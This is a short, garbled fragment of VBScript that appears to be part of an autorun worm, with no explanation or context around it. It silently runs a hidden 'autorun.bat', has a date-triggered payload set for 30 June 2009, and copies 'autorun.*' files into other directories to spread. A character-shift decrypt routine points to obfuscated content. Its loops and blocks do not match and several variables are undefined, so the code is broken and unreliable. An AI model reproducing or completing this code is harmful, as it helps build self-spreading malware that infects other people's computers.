rem autorun
on error resume next
Set WshShell =CreateObject("WScript.Shell")

if Year(Date)=2009 and Month(Date)=6 and Day(Date)=30 then
a=WshShell.Run("autorun.bat Over" ,0,True)

End If
next
if isdir then
wscript.sleep 60000
i=0
else
a=WshShell.Run("autorun.bat - "&dir ,0,True)
Of.CopyFile "autorun.*",dir&"\",True
a=WshShell.Run("autorun.bat + "&dir ,0,True)
End if
next
End if

function decrypt(dcode)
   dim texts
   dim i
   for i=1 to len(dcode)-4
   x=i mod 5
   texts=texts & chr(asc(mid(dcode,i,1))-x)
   next
   decrypt=texts
end function